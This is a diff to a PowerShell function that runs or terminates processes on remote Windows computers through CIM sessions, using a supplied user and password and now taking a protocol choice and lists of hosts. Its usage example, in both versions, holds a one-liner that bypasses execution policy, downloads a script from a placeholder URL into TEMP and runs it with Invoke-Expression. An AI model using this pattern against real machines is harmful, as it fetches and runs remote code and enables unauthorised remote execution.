@@ -1,26 +1,28 @@
 ﻿Function CIMSessionExecution {
     <#
     .SYNOPSIS
-    Execute scripts via CIM session.
+    Execute commands/scripts via CIM session.
     
     .DESCRIPTION
     This function for example can be used to execute script, also provides output from remote computer.
     
     .PARAMETER User
     Mandatory - user of the target machine.    
-    .PARAMETER Password
-    Mandatory - password on target machine.   
+    .PARAMETER Pass
+    Mandatory - password on target machine. 
+    .PARAMETER Command
+    Mandatory - execute or terminate your command on a remote computer.  
     .PARAMETER Computer
-    Mandatory - hostname of remote computer.   
+    Mandatory - hostname of remote computer, you can import list via pipeline.
+    .PARAMETER Protocol
+    Mandatory - choose desired protocol to be used in execution, default is set to Dcom.   
     .PARAMETER Class
     NotMandatory - choose class, default present, others unimplemented atm.
     .PARAMETER Method
     NotMandatory - choose method of a class, for now you can create or terminate a process.
-    .PARAMETER ExecuteCommand
-    Mandatory - execute or terminate your command on a remote computer.
-    
+  
     .EXAMPLE
-    CIMSessionExecution -User "your_user" -Password "your_pass" -Computer "your_computer_hostname" -ExecuteCommand 'powershell -executionpolicy bypass -Command "Invoke-WebRequest https://path_to_your_script/your_script.ps1 -UserAgent "your_secret" -UseBasicParsing -OutFile $env:TEMP\Script.ps1; & Invoke-Expression $env:TEMP\Script.ps1'
+    CIMSessionExecution -User "your_user" -Pass "your_pass" -Computer "your_computer_hostname" -Command 'powershell -executionpolicy bypass -Command "Invoke-WebRequest https://path_to_your_script/your_script.ps1 -UserAgent "your_secret" -UseBasicParsing -OutFile $env:TEMP\Script.ps1; & Invoke-Expression $env:TEMP\Script.ps1'
     
     .NOTES
     https://docs.microsoft.com/en-us/windows/win32/wmisdk/cimclas
@@ -33,10 +35,17 @@
         [string]$User,
 
         [Parameter(Mandatory = $true)]
-        [string]$Password,
- 
+        [string]$Pass,
+
+        [Parameter(Mandatory = $true)]
+        [string]$Command,
+
         [Parameter(Mandatory = $true)]
         [string]$Computer,
+
+        [Parameter(Mandatory = $false)]
+        [ValidateSet('Default', 'Dcom', 'Wsman')]
+        [string]$Protocol = 'Dcom',
 
         [Parameter(Mandatory = $false)]
         [ValidateSet('Process', 'Property')]
@@ -44,25 +53,22 @@
 
         [Parameter(Mandatory = $false)]
         [ValidateSet('Create', 'Terminate')]
-        [string]$Method = 'Create',
-
-        [Parameter(Mandatory = $true)]
-        [string]$ExecuteCommand
+        [string]$Method = 'Create'
     )
-    $Pass = ConvertTo-SecureString -AsPlainText $Password -Force
-    $SecureCredentials = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $Pass
+    $Password = ConvertTo-SecureString -AsPlainText $Pass -Force
+    $SecureCredentials = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $Password
     $SessionArgs = @{
-        ComputerName  = $Computer 
+        ComputerName  = $Computer
         Credential    = Get-Credential -Credential $SecureCredentials
-        SessionOption = New-CimSessionOption -Protocol Dcom
+        SessionOption = New-CimSessionOption -Protocol $Protocol
 
     }
     $MethodArgs = @{
-        ClassName  = "Win32_$Class"
-        MethodName = "$Method"
-        CimSession = New-CimSession @SessionArgs -Verbose
+        ClassName  = "Win32_$Class" 
+        MethodName = $Method
+        CimSession = New-CimSession @SessionArgs
         Arguments  = @{
-            CommandLine = $ExecuteCommand
+            CommandLine = $Command
         }
     }
     Invoke-CimMethod @MethodArgs
